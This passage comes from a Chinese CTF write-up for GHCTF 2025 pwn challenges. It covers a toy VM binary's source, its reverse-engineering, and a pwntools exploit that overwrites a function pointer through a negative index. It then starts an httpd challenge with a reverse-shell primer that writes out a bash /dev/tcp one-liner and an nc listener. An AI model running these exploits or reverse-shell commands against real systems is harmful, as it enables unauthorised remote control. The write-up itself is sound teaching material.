class="line">&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fetch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a1;</span><br><span class="line">a1 = memory[reg[<span class="number">11</span>]];</span><br><span class="line">reg[<span class="number">11</span>] += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cmd;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r3;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> imm;</span><br><span class="line">cmd = (code &amp; <span class="number">0xff000000</span>)&gt;&gt; <span class="number">24</span>;</span><br><span class="line">r1  = (code &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">r2  = (code &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">r3  = (code &amp; <span class="number">0xf</span>);</span><br><span class="line">imm = code&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">if</span> (r1 &gt; <span class="number">11</span> || r2 &gt; <span class="number">11</span> || r3 &gt; <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;out of index&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">reg[r1] = imm;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line"><span class="built_in">stack</span>[reg[<span class="number">10</span>]] = reg[r1];</span><br><span class="line">reg[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">reg[<span class="number">10</span>]-=<span class="number">1</span>;</span><br><span class="line">reg[r1] = <span class="built_in">stack</span>[reg[<span class="number">10</span>]];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">reg[r1] = reg[r2] + reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">reg[r1] = reg[r2] - reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">reg[r1] = reg[r2] ^ reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x70</span>:</span><br><span class="line">reg[r1] = reg[r2] &gt;&gt; reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">reg[r1] = reg[r2] &lt;&lt; reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">memory[reg[r1]] = reg[r2];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> ip;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> sp;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line"><span class="type">int</span> code;</span><br><span class="line">funcptr = my_print;</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;This is my vm.\n&quot;</span>,<span class="number">15</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;set your IP:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;ip);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;set your SP:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;sp);</span><br><span class="line">getchar();</span><br><span class="line">reg[<span class="number">10</span>] = sp;</span><br><span class="line">reg[<span class="number">11</span>] = ip;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ip &gt; <span class="number">0x2000</span> || !sp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;How much code do you want to execve:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;size);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;memory[count]);</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">&#123;</span><br><span class="line">code = fetch();</span><br><span class="line">execute(code);</span><br><span class="line">&#125;</span><br><span class="line">funcptr();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h2><ul><li><p>对于<code>vm_pwn</code>的这类题目，其实有涉及到一点计算机组成原理的<code>设计操作码</code>的技术。在计算机组成原理中，我们可以采用固定操作码的技术，也可以采用<code>扩展操作码</code>的技术。</p></li><li><p>这里我们稍微介绍一下固定操作码和拓展操作码。以我们常用的<code>64</code>位计算机为例子。</p></li><li><p>在<code>x64</code>架构下，我们的处理器一次能处理<code>8</code>字节的数据，我们在设计二进制操作码的时候可以这么设计。</p><ul><li>我们可以固定最高<code>16</code>位（也就是<code>49-64</code>位）表示要执行的指令，比如<code>mov</code>、<code>sub</code>、<code>add</code>这些指令</li><li>而我们而我们还可以分别设计<code>33-48</code>位表示目的寄存器的编号，<code>17-32</code>位表示源寄存器的编号，<code>1-16</code>位也还可以表示源寄存器的编号。</li><li>这时我们的固定指令三寄存器操作就设计完成了。就像题目<code>gift</code>中所给出的这样（虽然题目的是32位的操作码）</li><li><strong>固定指令操作码</strong>：本质上就是指令固定长度，即我们固定<code>49-64</code>位这边<code>16字节</code>就表示操作码。不管是二寄存器操作还是一寄存器操作</li></ul></li><li><p><strong>扩展操作码</strong>：在我们执行三寄存器指令的时候，我们也使用<code>49-64</code>位表示指令，但是我们要留<code>1</code>位标志位，表示程序执行的操作码是二指令操作码。</p><ul><li>例如下图，我们选取第<code>49</code>位作为标志位，这时当标志位为<code>0</code>时执行的是<code>3</code>寄存器操作，这是<code>49-64</code>位表示指令（包含了标志位）</li><li>而当我们标志位为<code>1</code>时，我们执行的是<code>2</code>寄存器操作，这时我们<code>33-64</code>（包含了标志位）表示的就是指令并且表示<code>2</code>寄存器操作的指令，这时我们指令由原来的最高<code>16</code>位表示，拓展成了最高<code>32</code>位程序表示</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310163934291.png" alt="image-20250310163934291"></p><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310163954263.png" alt="image-20250310163954263"></p><h2 id="my_vm_分析1"><a class="markdownIt-Anchor" href="#my_vm_分析1"></a> my_vm_分析1</h2><ul><li>按照流程我们先来<code>check</code>一下保护机制。发现并没有开启<code>PIE</code>保护</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310084657045.png" alt="image-20250310084657045"></p><ul><li><p>现在我们来反编译这个程序，查看一下这个程序的具体运行逻辑</p></li><li><p>我们先来查看<code>main</code>函数，我们按顺序分析这个程序</p><ul><li>首先会<code>funcptr</code>是一个函数指针，它指向了<code>my_print</code>这个函数，并且使用<code>init</code>对输入输出进行初始化</li><li>然后程序会让用户输入<code>SP</code>和<code>IP</code>，并且将用户输入的值放入<code>sp</code>和<code>ip</code>寄存器中。并检查用户输入的初始化值是否合法</li><li>之后程序会让用户输入程序要执行的指令数。然后进入循环，执行两个函数</li><li>最后调用<code>funcptr</code>这个函数指针指向的函数</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310164804658.png" alt="image-20250310164804658"></p><ul><li>接下来我们查看一下<code>fetch()</code>这个函数，发现就是一个取<code>memory[ip]</code>的值，并且将<code>ip</code>自增，然后返回取出来的值</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310165549267.png" alt="image-20250310165549267"></p><ul><li>接下来查看一下<code>execute()</code>这个函数，这个函数会将前面取出来的<code>memory[ip]</code>指令作为参数传递</li><li>这里我们一开始并不知道<code>HIBYTE(a1)</code>的值，此时我们就要查看汇编理解一下，我们先看到<code>v5</code>存储在<code>rbp-8</code>这个栈地址中</li><li>通过汇编我们可以看到<code>v5</code>存储的是<code>a1</code>的最高<code>8</code>位，之后通过伪c代码就可以看到<ul><li><code>v2</code>存储的值是<code>a1</code>的第<code>17-20</code>位</li><li><code>v3</code>存储的值是<code>a1</code>的第<code>9-12</code>位</li><li><code>v4</code>存储的值是<code>a1</code>的第<code>1-4</code>位</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310165818475.png" alt="image-20250310165818475"></p><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310170324721.png" alt="image-20250310170324721"></p><ul><li>我们接下去查看，我们会发现当<code>v5</code>即（<code>a1</code>的最高<code>8</code>位为特定的值时，会执行特定的类似于汇编指令）就像图中<ul><li><code>v5=0x50</code>，则会执行<code>reg[v2]=reg[v3]-reg[v4]</code>,也就是执行<code>sub</code>指令</li><li><code>v5=0x70</code>，则会执行<code>reg[v2]=reg[v3]&gt;&gt;reg[v4]</code>，也就执行<code>shr</code>指令</li><li>这时我们就可以知道，变量<code>v2</code>、<code>v3</code>、<code>v4</code>就代表着寄存器的编号。</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310170704072.png" alt="image-20250310170704072"></p><ul><li>这时我们通过逆向，可以归纳出剩下的指令，而该函数模拟的指令如下，这时我们还注意到<code>reg</code>这个数组是<code>int</code>类型，而不是<code>unsigned</code>类型</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10</span>  reg[v2] = imm;      mov imm</span><br><span class="line"><span class="number">0x20</span>  push reg[v2];  push</span><br><span class="line"><span class="number">0x30</span>  pop reg[v2] pop</span><br><span class="line"><span class="number">0x40</span>  reg[v2] = reg[v3] + reg[v4];  add</span><br><span class="line"><span class="number">0x50</span>  reg[v2] = reg[v3] - reg[v4];  sub</span><br><span class="line"><span class="number">0x60</span>  reg[v2] = reg[v3] ^ reg[v4];xor</span><br><span class="line"><span class="number">0x70</span>  reg[v2] = reg[v3] &gt;&gt; reg[v4];shr</span><br><span class="line"><span class="number">0x80</span>  reg[v2] = reg[v3] &lt;&lt; reg[v4];shl</span><br><span class="line"><span class="number">0x90</span>  memory[reg[v2]] = reg[v3];mov [reg[v2]],reg[v3]</span><br></pre></td></tr></table></figure><ul><li>我们在函数这块还注意到有一个<code>后门函数</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172420018.png" alt="image-20250310172420018"></p><ul><li>我们现在来查看一下<code>.bss</code>段的全局变量，这时我们发现<code>funcptr</code>就在<code>memory</code>相邻低地址处</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172233421.png" alt="image-20250310172233421"></p><ul><li>我们还注意到有<code>reg</code>这个数组</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172727594.png" alt="image-20250310172727594"></p><ul><li>还注意到<code>stack</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172747886.png" alt="image-20250310172747886"></p><h2 id="my_vm分析2"><a class="markdownIt-Anchor" href="#my_vm分析2"></a> my_vm分析2</h2><ul><li><p>这时我们可以确定漏洞点，就是利用<code>memory[reg[v2]]</code>这个指令进行负索引，从而修改<code>funcptr</code>这个指针为<code>backdoor()</code>这个函数的地址。</p></li><li><p>接下来我们就来构造一个负索引，我们先初始化<code>sp=0</code>、<code>ip=0x1000</code></p></li><li><p>首先我们需要构造寄存器的值为负值。一开始我们的各个寄存器都为<code>0</code>,我们先通过<code>mov imm</code>操作，将这个寄存器<code>0、1、2</code>赋值为<code>8、4、20</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">8</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">4</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">20</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">sp=<span class="number">0</span></span><br><span class="line">ip=<span class="number">0x100</span></span><br></pre></td></tr></table></figure><ul><li>之后我们通过<code>0x80</code>左移操作，将寄存器<code>r1</code>设置为<code>0x400000</code>，即：<code>r1=r1 &lt;&lt; r2</code>（<code>r1 =  4 &lt;&lt; 20</code>）</li><li>然后通过<code>0x10</code>这个操作将<code>0x877</code>赋值给<code>r3</code></li><li>最后通过<code>0x40</code>这个操作（<code>add</code>）将<code>r1</code>的值变为<code>0x400877</code>，这就是<code>backdoor</code>的地址，这一步操作就是为越界读写修改函数指针做准备</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[0]=8</span><br><span class="line">reg[1]=0x400877</span><br><span class="line">reg[2]=20</span><br><span class="line">reg[3]=0x877</span><br><span class="line">reg[4]=0</span><br><span class="line">reg[5]=0</span><br><span class="line">reg[6]=0</span><br><span class="line">reg[7]=0</span><br><span class="line">reg[8]=0</span><br><span class="line">reg[9]=0</span><br><span class="line">sp=0</span><br><span class="line">ip=0x100</span><br></pre></td></tr></table></figure><ul><li><p>之后我们要构造负索引，这时我们就用<code>0x50</code>，<code>sub</code>指令，使<code>r4-r0</code>，这时我们就得到了负值。</p></li><li><p>最后我们再通过<code>0x90</code>存指令，直接就可以实现越界读写，使得<code>函数指针指向backdoor</code></p></li><li><p>至于负索引要索引到多少，就需要动调去计算偏移了。</p></li></ul><h2 id="my_vm_exp"><a class="markdownIt-Anchor" href="#my_vm_exp"></a> my_vm_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28151</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./my_vm&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,r1,r2,r3=<span class="number">0</span></span>):</span><br><span class="line">    a = (op &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    a +=(r1 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    a +=(r2 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    a +=(r3 &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置PC=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;IP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置SP=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;SP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置Code_size=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;execve:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x8</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;break *0x400CFB&#x27;)</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">20</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># r1 = 0x400000</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">3</span>,<span class="number">0x08</span>,<span class="number">0x77</span>)</span><br><span class="line">code(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0x50</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x90</span>,<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="fruit_ninja"><a class="markdownIt-Anchor" href="#fruit_ninja"></a> fruit_ninja</h1><ul><li><p>还没写完，先看看这篇博客</p></li><li><p><a href="https://iyheart.github.io/2024/09/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/WEB_pwn/web-pwn%E4%B9%8Bhttpd/?highlight=httpd">web-pwn之httpd | iyheart的博客</a></p></li></ul><h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识-2"></a> 前置知识</h2><ul><li>需要理解<code>Linux</code>系统编程中的<code>创建线程函数</code>：参考这篇博客：<a href="https://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/">Linux系统编程1 | iyheart的博客</a></li><li>需要理解<code>Linux</code>网络编程中的一些函数：这里直接问<code>AI</code>吧</li><li>需要了解一下<code>Http</code>协议。<a href="https://www.runoob.com/http/http-messages.html">HTTP 消息结构 | 菜鸟教程</a>、<a href="https://www.runoob.com/http/http-methods.html">HTTP 请求方法 | 菜鸟教程</a></li><li>注意：<strong>请求方法这边只要看<code>get</code>方法和<code>Post</code>方法即可</strong></li><li>反弹shell</li><li>这里也简单介绍一下相关知识吧。</li></ul><h2 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h2><ul><li>什么是反弹shell，一般pwn都是我们攻击者去连接目标主机，而反弹shell是目标主机主动去连接攻击者的主机，并将执行权限给攻击者</li><li>反弹shell的前提：需要一个具有公网ip的服务器（IPv4）</li><li>在一般的情况下，pwn了目标主机，直接就<code>getshell</code>了，这时我们就可以直接<code>cat flag</code>目标主机就会将flag的内容发送给我们，但是在需要反弹shell的情况，当我们getshell之后，我们可以对目标主机执行命令，但是接收不到目标执行完命令后的内容。这就导致我们无法得到flag的内容，这时就是要反弹shell</li><li>反弹shell有几个办法，我们就先介绍一个办法吧：<ul><li>需要一个具有公网ip的服务器，假设其ip为<code>1.1.1.1</code>。</li><li>我们先指定开放该服务器的端口<code>2333</code>，输入指令为<code>nc -lvp 2333</code>或<code> nc -n -lvp 2333</code></li><li>然后我们getshell了目标靶机，这时我们就执行命令<code>bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1</code></li><li>这样目标靶机就连接上了我们的服务器，并且在我们服务器这边具有执行目标靶机目录的权限，也可以看到执行后的结果，这时我们就可以得到flag</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925182507092.png" alt="image-20240925182507092"></p><h2 id="fruit_ninja_分析"><a class="markdownIt-Anchor" href="#fruit_ninja_分析"></a> fruit_ninja_分析</h2><ul><li>题目来源：[<a href="https://www.nssctf.cn/problem/5143">GHCTF 2024 新生赛]Fruit Ninja | NSSCTF</a></li><li>题目附件：<a href="https://wwsq.lanzoue.com/inbAS2atudaf">https://wwsq.lanzoue.com/inbAS2atudaf</a> 密码:ffor</li><li>拿到附件先看看附件内容，发现文件<code>httpd</code>是一个二进制文件</li><li>然后<code>www</code>目录下的是web页面相关的前后端</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162120040.png" alt="image-20240925162120040"></p><ul><li>查看一下保护，发现保护全开</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162036762.png" alt="image-20240925162036762"></p><ul><li>接下来我们反编译一下该程序，先查看<code>main</code>函数，我们先理清楚一下<code>main</code>函数的执行过程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">程序先从main函数开始</span><br><span class="line">---&gt;调用startup函数，启动服务器(用于初始化网络服务或客户端)</span><br><span class="line">---&gt;调用accept函数,用来接受一个连接请求(这里会接收一些http协议的内容)</span><br><span class="line">---&gt;pthread_create()这个函数其实是创建一个线程的函数,这时会在<span class="keyword">if</span>语句中调用这个函数</span><br><span class="line"><span class="comment"># 创建一个线程后，这个线程会执行第三个参数所指向的函数(这个参数其实是一个函数指针类型)</span></span><br><span class="line">---&gt;调用accept_request,将处理接受到的http协议的内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体来分析accept_request这个函数</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162422115.png" alt="image-20240925162422115"></p><ul><li>然后我们主要是仔细分析一下<code>accept_request</code>这个函数，这个函数首先会传递一个参数过来，这个参数是文件描述符，这个文件描述符就是用于处理<code>服务器</code>和<code>客户端</code>交互的。</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310194858857.png" alt="image-20250310194858857"></p><ul><li>这里我们先了解一下<code>HTTP</code>请求报文使用<code>GET</code>方法和<code>POST</code>方法大概的模版。<ul><li>我们可以看到<code>GET</code>方法传递的参数就跟在它后面即<code>/1.php</code></li><li>而<code>POST</code>方法传递的参数是在最后那一行，并且比起<code>GET</code>方法<code>POST</code>方法还多了两行<code>Content-Length</code>、<code>Content-Type</code></li><li>而<code>Content-Length</code>后面跟的数字表明我们最后一行传递的参数一共有多少个字节</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 这是GET方法的http报文</span><br><span class="line">GET /1.php HTTP/1.1/\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org\r\n</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下面是POST方法的http报文</span><br><span class="line">POST /contact_form.php HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded\r\n</span><br><span class="line"></span><br><span class="line">name=Joe%20User&amp;request=Send%20me%20one%20of%20your%20catalogue</span><br></pre></td></tr></table></figure><ul><li>接下来我们分析一下<code>accept_request</code>函数，这个函数先会接收第一行<code>http</code>请求报文，然后判断是不是<code>GET</code>或者<code>POST</code>方法，如果是<code>GET</code>或者<code>POST</code>方法就继续处理数据。</li><li>如果是<code>GET</code>方法，就会获取相应的<code>web</code>目录</li></ul><p><img 